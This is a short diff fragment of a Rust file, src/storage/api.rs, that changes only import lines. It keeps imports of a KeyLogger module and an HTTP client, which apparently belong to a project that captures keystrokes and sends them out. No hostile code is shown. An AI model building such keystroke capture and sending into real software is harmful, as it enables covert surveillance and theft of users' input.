+++ src/storage/api.rs
@@ -1,5 +1,5 @@
+use crate::common::*;
 use crate::keylogger::KeyLogger;
-use crate::ProcessInfo;
 
 use reqwest::Client;
 use serde_json::json;
